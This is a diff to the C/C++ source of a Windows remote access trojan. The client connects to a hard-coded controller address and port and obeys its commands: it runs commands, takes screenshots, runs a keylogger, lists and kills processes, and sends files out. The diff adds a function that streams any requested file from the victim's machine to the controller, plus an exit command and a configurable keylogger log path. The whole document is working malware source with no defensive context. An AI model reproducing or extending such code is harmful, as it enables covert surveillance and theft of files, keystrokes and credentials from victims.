@@ -7,33 +7,38 @@
 #include <string.h>
 #include <wingdi.h>
 #include <iostream>
+#include <sstream>
 #include <conio.h>
 #include <fstream>
 #include <ctype.h>
 #include <tlhelp32.h>
+#include <stdint.h>
+#include <direct.h>
 
 using namespace Gdiplus;
+using namespace std;
 
 #pragma comment(lib,"gdiplus.lib")
-#define BUFFER_SIZE 10240
+#define BUFFER_SIZE 1024
 #define TRUE 1
-#define LOG_FILE "C:\\keylogger.txt"
 
-SOCKET initSocket(char* SERVER_IP, int PORT) {
+SOCKET initSocket(const char* SERVER_IP, int PORT) {
     WSADATA wsaData;
-    SOCKET clientSocket;
+    SOCKET clientSocket = INVALID_SOCKET;
     struct sockaddr_in serverAddress;
 
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         printf("Failed to initialize Winsock.\n");
-        return 1;
+        return INVALID_SOCKET;
     }
 
     // Create socket
-    if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientSocket == INVALID_SOCKET) {
         printf("Failed to create socket.\n");
-        return 1;
+        WSACleanup();
+        return INVALID_SOCKET;
     }
 
     // Prepare the server address structure
@@ -42,14 +47,17 @@ SOCKET initSocket(char* SERVER_IP, int PORT) {
     serverAddress.sin_port = htons(PORT);
 
     // Connect to the server
-    if (connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
+    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
         printf("Failed to connect to the server.\n");
-        return 1;
+        closesocket(clientSocket);
+        WSACleanup();
+        return INVALID_SOCKET;
     }
 
     printf("Connected to the server.\n");
     return clientSocket;
 }
+
 void sendData(SOCKET clientSocket, const char* buff)
 {
 	send(clientSocket, buff, strlen(buff), 0);
@@ -65,13 +73,14 @@ void redirectHelper(SOCKET clientSocket)
 {
 	char buff[BUFFER_SIZE] = { 0 };
 
-	sprintf(buff, "\n%s \n%s \n%s \n%s \n%s \n%s" \
+	sprintf(buff, "\n%s \n%s \n%s \n%s \n%s \n%s \n%s" \
 		"cmd			execute command"
 		"scr            screenshot"
 		"klg            keylogger"
 		"lpc            list running processes"
 		"kpc            kill a process"
 		"df             download a file"
+		"exit           close the connection"
 		);
 
 	sendData(clientSocket, buff);
@@ -197,30 +206,15 @@ void SCREENSHOTWorker(SOCKET clientSocket, char* pathSave)
 	DeleteObject(hdcMemDC);
 	ReleaseDC(NULL, hdcScreen);
 
-	// Save file screenshot on client side
-	FILE* fileSend = fopen("C:\\screenshot.png", "rb");
-	if (fileSend == NULL) {
-		printf("Error opening file\n");
-	}
-	// Send the file data
-	char bufferSend[1024];
-	int bytesReadSend;
-	while ((bytesReadSend = fread(bufferSend, 1, sizeof(bufferSend), fileSend)) > 0) {
-		int sendResult = send(clientSocket, bufferSend, bytesReadSend, 0);
-		if (sendResult == SOCKET_ERROR) {
-			printf("send failed with error: %d\n", WSAGetLastError());
-		}
-	}
-
 }
 
 //----------------------------------------------------------------KEYLOGGER
 // Save data into log file
-void saveData(const char* data) {
+void saveData(const char* data, char* pathFile) {
     FILE* logFile;
 
     // Open file
-    logFile = fopen(LOG_FILE, "a");
+    logFile = fopen(pathFile, "a");
 
     // Write data to log file
     fprintf(logFile, "%s", data);
@@ -261,7 +255,7 @@ const char* translateSpecialkey(int key) {
     }
 }
 
-void keyLogger(){
+void keyLogger(char* pathFile){
 	int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
     char specialKeyChar[20];
     bool isSpecialKey;
@@ -289,13 +283,13 @@ void keyLogger(){
                     // This is not a special key.
                     if (key > 32 && key <= 127){
                         sprintf(result, "%c", key);
-                        saveData(result);
+                        saveData(result, pathFile);
                     }
                     else {
                         // This is a special key. We need to translate it
                         const char* specialKeyChar = translateSpecialkey(key);
                         // Save data
-                        saveData(specialKeyChar);
+                        saveData(specialKeyChar, pathFile);
                     }
             }
         }
@@ -356,10 +350,45 @@ void killProcess(SOCKET clientSocket) {
 	}
 }
 
+//----------------------------------------------------------------FILE TRANSFERING
+void sendFileToServer(SOCKET clientSocket){
+	char filePath[BUFFER_SIZE];
+	recvData(clientSocket, filePath);
 
+	FILE* file = fopen(filePath, "rb");
+    if (!file) {
+        sendData(clientSocket, "Failed to open file!");
+    }
+
+	//send size file
+	fseek(file, 0, SEEK_END);
+    uint32_t lengthFile = ftell(file); 
+    fseek(file, 0, SEEK_SET);
+	uint32_t size = htonl(lengthFile);
+    send(clientSocket, (char*)&size , sizeof(size), 0);
+
+	//send data file
+	char buffer[BUFFER_SIZE];
+    int bytesRead, totalSent = 0;
+    while (totalSent < lengthFile) {
+        bytesRead = fread(buffer, 1, BUFFER_SIZE, file);
+        if (bytesRead <= 0) {
+            break;
+        }
+        int bytesSent = send(clientSocket, buffer, bytesRead, 0);
+        if (bytesSent <= 0) {
+            break;
+        }
+        totalSent += bytesSent;
+    }
+    fclose(file);
+
+    // Send a confirmation message to the client that the file transfer is complete
+    sendData(clientSocket, "File transfer complete!");
+}
 
 //----------------------------------------------------------------REDIRECT
-void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot)
+void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot, char* pathSaveKeyLogger)
 {
 	char buff[BUFFER_SIZE] = { 0 };
 
@@ -375,11 +404,11 @@ void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot)
 		else if (!strcmp(buff, "SCR"))
 		{
 			SCREENSHOTWorker(clientSocket, pathSaveScreenshot);
-			sendData(clientSocket, "Screenshot success! Save at C:\\screenshot.png");
+			sendData(clientSocket, "Screenshot success! Save at C:\\screenshot.png in client machine");
 		}
 		else if (!strcmp(buff, "KLG")){
 			sendData(clientSocket, "keyLogger start listening and save at C:\\keylogger.txt");
-			keyLogger();
+			keyLogger(pathSaveKeyLogger);
 		}
 		else if (!strcmp(buff, "LPC")){
 			char buffer[BUFFER_SIZE];
@@ -393,6 +422,12 @@ void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot)
 		else if (!strcmp(buff, "KPC")){
 			killProcess(clientSocket);
 		}
+		else if (!strcmp(buff, "DF")){
+			sendFileToServer(clientSocket);
+		}
+		else if (!strcmp(buff, "exit")){
+			closesocket(clientSocket);
+		}
 
 		memset(buff, 0, BUFFER_SIZE);
 	}
@@ -401,11 +436,16 @@ void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot)
 
 
 int main(){
-    char HOST[] = "192.168.20.59", pathSaveScreenshot[] = "C:\\screenshot.png";
+    char HOST[] = "192.168.20.59", pathSaveScreenshot[] = "C:\\screenshot.png", pathSaveKeyLogger[] = "C:\\keylogger.txt";
     int PORT = 8008;
 
     SOCKET clientSocket;
     clientSocket = initSocket(HOST, PORT);
+
+	if (clientSocket == INVALID_SOCKET) {
+        printf("Failed to initialize the socket.\n");
+        return EXIT_FAILURE;
+    }
 
     const char *banner = 
         " *******       **     **********             **               **             \n"
@@ -424,11 +464,15 @@ int main(){
 		"lpc        list running processes \n"
 		"kpc        kill a process \n"
 		"df         download a file \n"
+		"exit       close the connection \n"
 		;
+
     sendData(clientSocket, banner);
 
-    redirectCmd(clientSocket, pathSaveScreenshot);
-    
-    return 0;
+    redirectCmd(clientSocket, pathSaveScreenshot, pathSaveKeyLogger);
+
+    closesocket(clientSocket);
+    WSACleanup();
+    return EXIT_SUCCESS;
 }
 
